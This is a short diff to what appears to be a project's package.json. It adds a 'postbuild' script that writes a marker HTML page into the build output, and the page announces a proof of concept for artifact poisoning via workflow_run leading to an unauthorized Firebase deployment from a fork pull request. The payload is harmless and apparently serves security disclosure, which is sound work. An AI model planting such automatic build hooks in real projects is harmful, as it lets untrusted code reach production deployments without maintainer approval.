@@ -16,6 +16,7 @@
     "last 2 Safari versions"
   ],
   "scripts": {
+    "postbuild": "echo '<html><body><h1>PoC: Artifact Poisoning via workflow_run — Unauthorized Firebase Deployment</h1><p>This content was deployed from a fork PR without repository maintainer approval.</p></body></html>' > dist/client/poc-artifact-poisoning.html",
     "update-conditions": "node ./build_tools/update-conditions.ts",
     "prepare": "node ./build_tools/build-package.ts --inplace --if-not-toplevel",
     "prepack": "node ./build_tools/build-package.ts --inplace",
